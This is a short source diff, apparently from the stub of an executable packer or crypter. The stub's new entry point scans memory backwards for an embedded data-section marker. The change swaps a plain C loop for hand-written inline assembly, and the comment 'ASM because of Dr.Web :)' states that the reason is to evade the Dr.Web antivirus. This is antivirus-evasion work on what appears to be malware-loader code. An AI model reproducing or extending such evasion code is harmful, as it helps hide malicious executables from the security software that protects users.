@@ -183,11 +183,35 @@ int __stdcall NewEntryPoint()
 		pop dwCurrentAddr
 	}
 
-	// *** Find the ending marker of data section <E> 
+	// *** Find the ending marker of data section <E> - ASM because of Dr.Web :)
+	while(1)
+	{
+		__asm
+		{
+			mov ecx, [dwCurrentAddr]
+magicloop:
+			sub ecx, 1
+			mov edx, [ecx]
+			mov ebx, edx
+			and ebx, 0xffff0000
+			and edx, 0x0000ffff
+
+			cmp edx, 0x453c
+			jne magicloop
+			nop
+			cmp ebx, 0x003e0000
+			jne magicloop
+			mov [dwCurrentAddr], ecx
+			jmp endmagicloop
+		}
+	}
+endmagicloop:
+
+	/*
 	DWORD dwMagic = 0;
 	while ( dwMagic != 0x003E453C )
 		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
-	
+	*/
 	// *** Total size of data section
 	dwCurrentAddr -= sizeof(DWORD);
 	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
